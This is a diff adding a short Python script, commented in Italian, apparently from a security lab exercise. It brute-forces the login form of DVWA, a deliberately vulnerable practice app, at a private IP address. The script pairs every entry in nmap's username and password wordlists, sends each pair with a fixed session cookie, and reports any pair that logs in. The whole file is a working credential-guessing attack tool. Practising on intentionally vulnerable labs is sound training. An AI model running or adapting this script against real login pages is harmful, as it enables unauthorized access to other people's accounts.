@@ -1,0 +1,37 @@
+import http.client, urllib.parse
+#user = "admin"
+#pwd = "password"
+base_url = ("/dvwa/vulnerabilities/brute/")
+#password=("password=",pwd)
+#login= ("Login=","Login#")
+user_list = open('/usr/share/nmap/nselib/data/usernames.lst')
+pwd_list = open('/usr/share/nmap/nselib/data/passwords.lst')
+#con il comando readlines() permettiamo al programma di leggere le righe come elementi interni alla lista
+user_list = user_list.readlines()
+pwd_list = pwd_list.readlines()
+#primo ciclo di lettura degli username
+for user in user_list:
+	user = user.rstrip()
+	#comando di controllo per verificare la corretta lettura dei nomi(lasciato come commento)
+	#print(user)
+	#ciclo for annidato per inserire ogni password ai relativi username
+	for pwd in pwd_list:
+		pwd = pwd.rstrip()
+		url = urllib.parse.urlencode({'username':user, 'password':pwd,'Login':"Login#"})
+		urle = ''
+		urle += '?' + url
+		urlf = ''.join(base_url+ urle)
+		#urlg = ''
+		#urlg += '?' + urlf
+		#print('URL finale ',urlf)
+		#print('url finaleg ',urlg)
+		
+		headers = {"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml",'Cookie':f'PHPSESSID={"687232e19a3ea1541f40b4e21a5aa43d"}'}
+		conn = http.client.HTTPConnection('192.168.50.101',80)
+		#inserimento delle richieste nella connessione
+		conn.request("GET",urlf,url ,headers)
+		response = conn.getresponse()
+		data = response.read().decode()
+		#print(data)
+		if "Welcome to the password" in str(data):
+			print("logged with", user,"-",pwd)
